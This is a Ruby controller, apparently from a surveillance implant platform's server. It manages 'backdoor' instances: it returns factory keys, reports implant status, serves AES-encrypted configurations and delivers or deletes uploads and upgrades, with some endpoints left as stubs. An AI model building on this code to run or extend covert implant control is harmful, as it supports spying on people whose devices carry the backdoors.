#
# Controller for the Backdoor objects
#
require 'rcs-common/crypt'

module RCS
module DB

class BackdoorController < RESTController
  include RCS::Crypt

  # retrieve the factory key of the backdoors
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def factory_keys
    require_auth_level :server

    classes = {}

    # request for a specific instance
    if params['backdoor'] then
      Item.where({_kind: 'factory', build: params['backdoor']}).each do |entry|
          classes[entry[:build]] = entry[:confkey]
      end
    # all of them
    else
      Item.where({_kind: 'factory'}).each do |entry|
          classes[entry[:build]] = entry[:confkey]
        end
    end

    return STATUS_OK, *json_reply(classes)
  end

  # retrieve the status of a backdoor instance.
  def status
    require_auth_level :server
    
    request = JSON.parse(params['backdoor'])

    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: request['subtype'].downcase}).first

    #TODO: all the backdoor.identify stuff...

    # backdoor not found, what to do ?
    return STATUS_NOT_FOUND if backdoor.nil?

    status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
        
    return STATUS_OK, *json_reply(status)
  end


  def config
    backdoor = Item.where({_kind: 'backdoor', _mid: params['backdoor'].to_i}).first

    case @req_method
      when 'GET'
        config = backdoor.configs.where(:sent.exists => false).last
        return STATUS_NOT_FOUND if config.nil?

        # encrypt the config for the backdoor using the confkey
        json_config = JSON.parse(config[:config])
        bson_config = BSON.serialize(json_config)
        enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(backdoor[:confkey]))

        return STATUS_OK, enc_config, 'binary/octet-stream'

      when 'DELETE'
        config = backdoor.configs.where(:sent.exists => false).last
        config.sent = Time.now.getutc.to_i
        config.save
        trace :info, "[#{@req_peer}] Configuration sent [#{params['backdoor']}]"
    end

    return STATUS_OK
  end


  # retrieve the list of upload for a given backdoor
  def uploads
    require_auth_level :server, :tech

    #TODO: implement this
    list = [] #DB.instance.backdoor_uploads(params['backdoor'])

    return STATUS_OK, *json_reply(list)
  end

  # retrieve or delete a single upload entity
  def upload
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'GET'
        upload = DB.instance.backdoor_upload(request['backdoor_id'], request['upload_id'])
        trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{upload[:content].size.to_s_bytes}"
        return STATUS_OK, upload[:content], "binary/octet-stream"
      when 'DELETE'
        DB.instance.backdoor_del_upload(request['backdoor_id'], request['upload_id'])
        trace :info, "[#{@req_peer}] Deleted the UPLOAD #{request}"
    end

    return STATUS_OK
  end

  # retrieve the list of upgrade for a given backdoor
  def upgrades
    require_auth_level :server, :tech

    #TODO: implement this
    list = [] #DB.instance.backdoor_upgrades(params['backdoor'])

    return STATUS_OK, *json_reply(list)
  end

  # retrieve or delete a single upgrade entity
  def upgrade
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'GET'
        upgrade = DB.instance.backdoor_upgrade(request['backdoor_id'], request['upgrade_id'])
        trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{upgrade[:content].size.to_s_bytes}"
        return STATUS_OK, upgrade[:content], "binary/octet-stream"
      when 'DELETE'
        DB.instance.backdoor_del_upgrades(request['backdoor_id'])
        trace :info, "[#{@req_peer}] Deleted the UPGRADE #{request}"
    end

    return STATUS_OK
  end

  # retrieve the list of download for a given backdoor
  def downloads
    require_auth_level :server, :tech

    #TODO: implement this
    list = [] #DB.instance.backdoor_downloads(params['backdoor'])

    return STATUS_OK, *json_reply(list)
  end

  def download
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'DELETE'
        DB.instance.backdoor_del_download(request['backdoor_id'], request['download_id'])
        trace :info, "[#{@req_peer}] Deleted the DOWNLOAD #{request}"
    end

    return STATUS_OK
  end

  # retrieve the list of filesystem for a given backdoor
  def filesystems
    require_auth_level :server, :tech

    #TODO: implement this
    list = [] #DB.instance.backdoor_filesystems(params['backdoor'])

    return STATUS_OK, *json_reply(list)
  end

  def filesystem
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'DELETE'
        DB.instance.backdoor_del_filesystem(request['backdoor_id'], request['filesystem_id'])
        trace :info, "[#{@req_peer}] Deleted the FILESYSTEM #{request}"
    end
    
    return STATUS_OK
  end

end

end #DB::
end #RCS::
